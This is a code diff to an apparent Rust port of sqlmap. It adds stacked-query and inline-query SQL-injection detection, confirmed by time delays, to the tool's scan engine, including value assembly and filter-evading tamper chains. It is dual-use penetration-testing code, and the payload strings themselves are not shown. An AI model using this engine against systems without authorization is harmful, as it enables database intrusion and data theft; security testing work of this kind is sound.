@@ -226,7 +226,14 @@ impl<'a> Engine<'a> {
                 Technique::Error => self.check_error(param, &boundaries, dbms_hint.as_deref()),
                 Technique::Time => self.check_time(param, baseline, &boundaries, dbms_hint.as_deref()),
                 Technique::Union => self.check_union(param, &orig_page, &boundaries, dbms_hint.as_deref()),
-                other => self.say(format!("  technique {other:?} not ported yet - skipped")),
+                Technique::Stacked => self.check_delay(
+                    param, baseline, &boundaries, dbms_hint.as_deref(),
+                    pl::stacked_payloads(), Technique::Stacked, DelayMode::Plain,
+                ),
+                Technique::Inline => self.check_delay(
+                    param, baseline, &boundaries, dbms_hint.as_deref(),
+                    pl::inline_payloads(), Technique::Inline, DelayMode::FullReplace,
+                ),
             }
         }
     }
@@ -399,17 +406,52 @@ impl<'a> Engine<'a> {
     /// Time-based blind (port of the time branch of `checkSqlInjection`):
     /// response must be delayed by ~time_sec, confirmed on a second request.
     fn check_time(&mut self, param: &Param, baseline: Duration, boundaries: &[Boundary], dbms_hint: Option<&str>) {
+        self.check_delay(
+            param, baseline, boundaries, dbms_hint,
+            pl::time_payloads(), Technique::Time, DelayMode::Boundary,
+        );
+    }
+
+    /// Shared delay-confirmed check behind techniques T, S and Q (sqlmap
+    /// confirms stacked and inline queries by time delay too, repeating the
+    /// request once to rule out network jitter).
+    fn check_delay(
+        &mut self,
+        param: &Param,
+        baseline: Duration,
+        boundaries: &[Boundary],
+        dbms_hint: Option<&str>,
+        payloads: Vec<pl::Payload>,
+        technique: Technique,
+        mode: DelayMode,
+    ) {
         let need = Duration::from_secs(self.conf.time_sec as u64);
         let (lvl, rsk) = (self.conf.level, self.conf.risk);
-        for p in pl::time_payloads().into_iter().filter(|p| Self::payload_ok_static(lvl, rsk, p, dbms_hint)) {
+        for p in payloads.into_iter().filter(|p| Self::payload_ok_static(lvl, rsk, p, dbms_hint)) {
             let pl::Check::Time { q } = p.check else { continue };
-            for (bi, boundary) in boundaries.iter().enumerate() {
-                let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
-                if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) && bi < 6 {
-                    continue;
+            // Stacked fragments carry their own quote closing; inline queries
+            // replace the value outright. Only classic time payloads iterate
+            // the boundary list.
+            let iter: Vec<(usize, &Boundary)> = match mode {
+                DelayMode::Boundary => boundaries.iter().enumerate().collect(),
+                _ => boundaries[..1].iter().enumerate().collect(),
+            };
+            for (bi, boundary) in iter {
+                if matches!(mode, DelayMode::Boundary) {
+                    let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
+                    if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) && bi < 6 {
+                        continue;
+                    }
                 }
-                let seed = 9000 + bi as u64;
-                let val = self.assemble(param, boundary, q, seed);
+                let seed = 9000 + bi as u64 + match technique {
+                    Technique::Stacked => 100,
+                    Technique::Inline => 200,
+                    _ => 0,
+                };
+                let val = match mode {
+                    DelayMode::FullReplace => assemble_full(self.conf, &mut self.log, q, seed),
+                    _ => self.assemble(param, boundary, q, seed),
+                };
                 let first = match self.fetch(&self.build_request(param, &val)) {
                     Ok(r) => r,
                     Err(_) => continue,
@@ -424,13 +466,13 @@ impl<'a> Engine<'a> {
                 };
                 if second.elapsed >= need {
                     self.say(format!(
-                        "  INJECTABLE (time-based): '{}' with {} - {:.1?}/{:.1?} vs baseline {:.1?}",
+                        "  INJECTABLE ({technique:?}): '{}' with {} - {:.1?}/{:.1?} vs baseline {:.1?}",
                         param.name, p.title, first.elapsed, second.elapsed, baseline
                     ));
                     self.kb.add_injection(Injection {
                         place: param.place,
                         parameter: param.name.clone(),
-                        technique: Technique::Time,
+                        technique,
                         boundary: boundary.clone(),
                         payload: val,
                         dbms: dbms_hint.map(|s| s.to_string()),
@@ -506,6 +548,35 @@ pub(crate) fn build_request(conf: &Config, param: &Param, new_value: &str) -> Re
             }
         }
     }
+
+/// How a delay-confirmed payload is placed into the parameter value.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum DelayMode {
+    /// Classic time-based blind: payload sits inside boundary prefix/suffix
+    /// pairs (technique T).
+    Boundary,
+    /// Stacked queries: the fragment closes any quoting itself; only the
+    /// plain (empty) boundary is used (technique S).
+    Plain,
+    /// Inline queries: the payload REPLACES the parameter value (technique Q).
+    FullReplace,
+}
+
+/// Assemble an inline-query value: the rendered payload is the whole value
+/// (sqlmap inline_query.xml semantics), then the tamper chain.
+fn assemble_full(conf: &Config, log: &mut Vec<String>, payload_q: &str, seed: u64) -> String {
+    let rn = rand_num(seed);
+    let rn1 = rand_num(seed.wrapping_mul(7).wrapping_add(1));
+    let rs = rand_str(seed.wrapping_mul(13).wrapping_add(3));
+    let mut joined = pl::render(payload_q, conf.time_sec, rn, rn1, &rs);
+    if !conf.tampers.is_empty() {
+        match sqlmap_tamper::apply_all(&conf.tampers, &joined, seed) {
+            Ok(t) => joined = t,
+            Err(e) => log.push(format!("  tamper error: {e}")),
+        }
+    }
+    joined
+}
 
 pub(crate) fn assemble(conf: &Config, log: &mut Vec<String>, param: &Param, boundary: &Boundary, payload_q: &str, seed: u64) -> String {
         let rn = rand_num(seed);
